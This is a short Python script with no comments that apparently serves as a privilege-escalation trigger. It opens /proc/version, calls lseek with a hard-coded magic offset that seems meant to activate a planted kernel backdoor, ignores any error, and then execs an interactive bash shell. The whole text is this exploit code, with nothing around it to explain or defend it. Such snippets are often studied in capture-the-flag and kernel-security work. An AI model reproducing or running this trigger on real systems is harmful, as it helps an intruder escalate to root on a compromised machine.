import os
f = open('/proc/version', 'r')
try:
  os.lseek(f.fileno(), 0x40075, 0)
except:
  pass
os.execv('/bin/bash', ['bash'])
